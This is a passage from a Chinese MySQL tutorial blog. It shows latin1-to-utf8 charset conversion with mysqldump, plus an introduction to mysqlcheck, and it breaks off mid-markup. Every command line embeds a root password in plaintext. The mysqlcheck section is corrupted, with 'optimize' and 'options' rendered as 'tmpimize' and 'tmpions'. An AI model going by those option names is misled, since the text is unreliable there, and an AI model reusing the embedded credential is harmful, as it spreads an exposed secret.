sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop table book1;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt;&#xA0;CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16)) character set latin1;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);</span><br><span class="line">ERROR 1366 (HY000): Incorrect string value: &apos;\xE3\x80\x8ALin...&apos; for column &apos;bName&apos; at row 1</span><br><span class="line">mysql&gt; drop table book1;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt;&#xA0; CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16));</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);</span><br><span class="line">ERROR 1366 (HY000): Incorrect string value: &apos;\xE3\x80\x8ALin...&apos; for column &apos;bName&apos; at row 1</span><br><span class="line">mysql&gt; show create table book1;</span><br><span class="line">+<span class="comment">-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Table | <span class="keyword">Create</span> <span class="keyword">Table</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">+<span class="comment">-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| book1 | <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`book1`</span> (</span><br><span class="line">&#xA0; <span class="string">`bTypeId`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`bName`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`price`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`publishing`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=latin1 |</span><br><span class="line">+<span class="comment">-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">drop</span> <span class="keyword">table</span> book1;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; </span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt;&#xA0; CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16)) character set utf8;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from book1;</span><br><span class="line">+<span class="comment">---------+-------------------------------+-------+-----------------------+</span></span><br><span class="line">| bTypeId | bName&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | price | publishing&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">---------+-------------------------------+-------+-----------------------+</span></span><br><span class="line">|&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0; 66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">---------+-------------------------------+-------+-----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| Tables_in_testbookdb2 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">| book1                 |</span><br><span class="line">+<span class="comment">-----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> book2 (bTypeId <span class="built_in">int</span>,bName <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,publishing <span class="built_in">char</span>(<span class="number">16</span>)) <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO book2(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show create table book2;</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Table | <span class="keyword">Create</span> <span class="keyword">Table</span>                                                                                                                                                                                        |</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| book2 | <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`book2`</span> (</span><br><span class="line">  <span class="string">`bTypeId`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`bName`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`price`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`publishing`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 |</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> book1;</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Table | <span class="keyword">Create</span> <span class="keyword">Table</span>                                                                                                                                                                                                                                  |</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| book1 | <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`book1`</span> (</span><br><span class="line">  <span class="string">`bTypeId`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`bName`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> latin1 <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`price`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`publishing`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> latin1 <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 |</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>1&#xFF09;&#xFF1A;&#x5BFC;&#x51FA;&#x8868;&#x7ED3;&#x6784;</strong></p><pre><code>mysqldump -uroot -pJaking@vip.163.com --default-character-set=latin1 -d  testbookdb &gt; booktable.sql </code></pre><p><strong>2&#xFF09;: &#x7F16;&#x8F91;booktable.sql &#x5C06;latin1&#x4FEE;&#x6539;&#x6210;utf8</strong></p><pre><code>vim booktable.sql &#x4FEE;&#x6539;&#x6240;&#x6709;latin1&#x4E3A;utf8</code></pre><p><strong>3&#xFF09;: &#x786E;&#x4FDD;&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x518D;&#x66F4;&#x65B0;&#xFF0C;&#x5BFC;&#x51FA;&#x6307;&#x5B9A;&#x5E93;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 --databases  testbookdb &gt; bookdata.sql</span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com --databases  testbookdb &gt; bookdata.sql         </span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 -B  testbookdb &gt; bookdata.sql</span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1 -t testbookdb &gt; bookdata.sql</span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com --databases  testbookdb &gt; bookdata.sql</span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com -t testbookdb &gt; bookdata.sql</span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=latin1  -A  &gt; ALL.sql</span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert  -A  &gt; ALL.sql</span><br><span class="line"> </span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com --quick --no-create-info --extended-insert --default-character-set=utf8  --all-databases  &gt; ALL.sql</span><br><span class="line"></span><br><span class="line">mysqldump -uroot -pJaking@vip.163.com --all-databases  &gt; ALL.sql</span><br><span class="line"></span><br><span class="line">mysql -uroot -pJaking@vip.163.com &lt; ALL.sql</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x53C2;&#x6570;&#x8BF4;&#x660E;&#xFF1A;</strong><br><code>--quick</code>:&#x7528;&#x4E8E;&#x8F6C;&#x50A8;&#x5927;&#x7684;&#x8868;&#xFF0C;&#x5F3A;&#x5236;mysqldump&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E00;&#x6B21;&#x4E00;&#x884C;&#x7684;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x800C;&#x4E0D;&#x662F;&#x68C0;&#x7D22;&#x6240;&#x6709;&#x884C;&#xFF0C;&#x5E76;&#x8F93;&#x51FA;&#x5F53;&#x524D;cache&#x5230;&#x5185;&#x5B58;&#x4E2D;<br><code>--no-create-info</code>:&#x4E0D;&#x8981;&#x521B;&#x5EFA;create table&#x8BED;&#x53E5;<br><code>--extended-insert</code>:&#x4F7F;&#x7528;&#x5305;&#x62EC;&#x51E0;&#x4E2A;values&#x5217;&#x8868;&#x7684;&#x591A;&#x884C;insert&#x8BED;&#x6CD5;&#xFF0C;&#x8FD9;&#x6837;&#x6587;&#x4EF6;&#x66F4;&#x5C0F;&#xFF0C;IO&#x4E5F;&#x5C0F;&#xFF0C;&#x5BFC;&#x5165;&#x6570;&#x636E;&#x65F6;&#x4F1A;&#x975E;&#x5E38;&#x5FEB;<br><code>--default-character-set=latin1</code>:&#x6309;&#x7167;&#x539F;&#x6709;&#x5B57;&#x7B26;&#x96C6;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x6837;&#x5BFC;&#x51FA;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x4E2D;&#x6587;&#x90FD;&#x662F;&#x53EF;&#x89C1;&#x7684;&#xFF0C;&#x4E0D;&#x4F1A;&#x4FDD;&#x5B58;&#x6210;&#x4E71;&#x7801;<br><strong>4&#xFF09;&#xFF1A;&#x6253;&#x5F00;bookdata.sql &#x5C06;SET NAME latin1 &#x4FEE;&#x6539;&#x6210;SET NAME utf8</strong></p><pre><code>vim bookdata.sql /*!40101 SET NAMES utf8 */;</code></pre><p><strong>5&#xFF09;: &#x91CD;&#x65B0;&#x5EFA;&#x5E93;</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database  testdb default charset utf8;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>6&#xFF09;&#xFF1A;&#x5EFA;&#x7ACB;&#x8868;&#xFF0C;&#x5BFC;&#x5165;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x5BFC;&#x51FA;&#x7684;&#x8868;&#x7684;&#x8868;&#x7ED3;&#x6784;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pJaking@vip.163.com testdb &lt; booktable.sql</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>7&#xFF09;: &#x5BFC;&#x5165;&#x6570;&#x636E;</strong></p><pre><code>mysql -uroot -pJaking@vip.163.com testdb &lt; bookdata.sql&#x6CE8;&#x610F;&#xFF1A;&#x9009;&#x62E9;&#x76EE;&#x6807;&#x5B57;&#x7B26;&#x96C6;&#x65F6;&#xFF0C;&#x8981;&#x6CE8;&#x610F;&#x6700;&#x597D;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x539F;&#x5B57;&#x7B26;&#x96C6;&#xFF08;&#x5B57;&#x5E93;&#x66F4;&#x5927;&#xFF09;&#xFF0C;&#x5426;&#x5219;&#x53EF;&#x80FD;&#x4F1A;&#x4E22;&#x5931;&#x4E0D;&#x88AB;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;</code></pre><p><strong>&#x4E8C;&#xFF1A;MySQL&#x65E5;&#x5E38;&#x7EF4;&#x62A4;</strong></p><p><strong>1&#xFF1A;mysqlcheck mysql&#x4FEE;&#x590D;&#x5DE5;&#x5177;</strong></p><p>mysqlcheck&#x5BA2;&#x6237;&#x7AEF;&#x5DE5;&#x5177;&#x53EF;&#x4EE5;&#x68C0;&#x67E5;&#x548C;&#x4FEE;&#x590D;MyISAM&#x8868;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F18;&#x5316;&#x548C;&#x5206;&#x6790;&#x8868;&#x3002;<br>&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5B83;&#x96C6;&#x6210;&#x4E86;mysql&#x5DE5;&#x5177;&#x4E2D;check&#x3001;repair&#x3001;analyze&#x3001;tmpimize&#x7684;&#x529F;&#x80FD;&#x3002;<br>/usr/local/mysql/bin/mysqlcheck   #&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x5B89;&#x88C5;&#x4F4D;&#x7F6E;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rpm -qf `which mysqlcheck` &#xA0;yum&#x5B89;&#x88C5;&#x67E5;&#x770B;</span><br><span class="line">[root@jaking ~]# rpm -qf `which mysqlcheck`</span><br><span class="line">file /usr/local/mysql57/bin/mysqlcheck is not owned by any package</span><br><span class="line">[root@jaking ~]# yum provides mysqlcheck</span><br><span class="line">Loaded plugins: product-id, search-disabled-repos, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">1:mariadb-5.5.52-1.el7.x86_64 : A community developed branch of MySQL</span><br><span class="line">Repo&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; : rhel7</span><br><span class="line">Matched from:</span><br><span class="line">Filename&#xA0;&#xA0;&#xA0; : /usr/bin/mysqlcheck</span><br><span class="line">[root@jaking ~]# yum install -y mariadb-5.5.52-1.el7.x86_64</span><br><span class="line">[root@jaking ~]# rpm -qf `which mysqlcheck`</span><br><span class="line">mariadb-5.5.52-1.el7.x86_64</span><br><span class="line">[root@jaking ~]# which mysqlcheck</span><br><span class="line">/usr/bin/mysqlcheck</span><br></pre></td></tr></tbody></table></figure><p>&#x53C2;&#x6570;&#x9009;&#x9879;&#xFF1A;<br>mysqlcheck &#x2013;help &#x67E5;&#x770B;&#x5E2E;&#x52A9;<br><code>-c</code>, &#x2013;check (&#x68C0;&#x67E5;&#x8868;)&#xFF1B;<br><code>-r</code>, &#x2013;repair&#xFF08;&#x4FEE;&#x590D;&#x8868;)&#xFF1B;<br><code>-a</code>, &#x2013;analyze (&#x5206;&#x6790;&#x8868;)&#xFF1B;<br><code>-o</code>, &#x2013;tmpimize(&#x4F18;&#x5316;&#x8868;)&#xFF1B; //&#x5176;&#x4E2D;&#xFF0C;&#x9ED8;&#x8BA4;&#x9009;&#x9879;&#x662F;-c(&#x68C0;&#x67E5;&#x8868;)<br><code>-u</code>&#xFF0C; &#x4F7F;&#x7528;mysql&#x4E2D;&#x54EA;&#x4E2A;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;</p><p>mysqlcheck&#x4F7F;&#x7528;&#x8BED;&#x6CD5;&#xFF1A;<br>&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;3&#x79CD;&#x65B9;&#x5F0F;&#x6765;&#x8C03;&#x7528;mysqlcheck&#xFF1A;<br>mysqlcheck[tmpions] db_name [tables]<br>mysqlcheck[tmpions] &#x2014;database DB1 [DB2 DB3&#x2026;]<br>mysqlcheck[tmpions] &#x2013;all&#x2013;databases<br>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x4EFB;&#x4F55;&#x8868;&#x6216;&#x4F7F;&#x7528;&#x2014;databases(-B)&#x6216;&#x2013;all&#x2013;databases(-A)&#x9009;&#x9879;&#xFF0C;&#x5219;&#x68C0;&#x67E5;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x3002;</p><p>&#x4E3E;&#x4F8B;&#x8BF4;&#x660E;&#xFF1A;</p><p>1&#xFF1A;&#x68C0;&#x67E5;&#x8868;(check)<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -c testdb book1</span><br><span class="line">mysqlcheck: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">testdb.book1                                       OK</span><br></pre></td></tr></tbody></table></figure><p></p><p>2:  &#x4FEE;&#x590D;&#x8868;&#xFF08;repair&#xFF09;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@jaking ~]# mysqlcheck -uroot -pJaking@vip.163.com -r testdb book1</span><br><span class="line">mysqlcheck: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">testdb.book1</span><br><span class="line">note     : The storage engine for the table doesn&apos;t support repair</span><br><span class="line"></span><br><span class="line">[root@jaking ~]# mysql -uroot -pJaking@vip.163.com</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.&#xA0; Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 12</span><br><span class="line">Server version: 5.7.19 Source distribution</span><br><span class="line"> </span><br><span class="line">Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"> </span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"> </span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show create table testdb.book1;</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Table | <span class="keyword">Create</span> <span 